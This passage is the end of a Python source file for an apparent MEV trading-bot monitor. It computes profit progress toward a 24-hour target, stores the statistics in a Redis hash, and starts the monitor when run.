            LOGERROR(f"Progress reporting error: {str(e)}")
            
    def _update_mev_stats(self):
        """Update MEV statistics with progress tracking"""
        try:
            current_time = time.time()
            elapsed_time = current_time - self.start_time
            hours_remaining = 24 - (elapsed_time / 3600)  # Assuming 24-hour target
            
            stats = {
                'current_profit': float(self.current_profit),
                'target_amount': float(self.target_amount),
                'progress_percent': float((self.current_profit / self.target_amount) * 100),
                'hours_remaining': float(hours_remaining),
                'required_rate': float((self.target_amount - self.current_profit) / hours_remaining if hours_remaining > 0 else 0),
                'last_update': current_time
            }
            
            self.redis_conn.hset("faithswarm:monitor_stats", mapping=stats)
            
        except Exception as e:
            LOGERROR(f"Stats update error: {str(e)}")

if __name__ == "__main__":
    monitor = TransactionMonitor()
    monitor.start_monitoring() 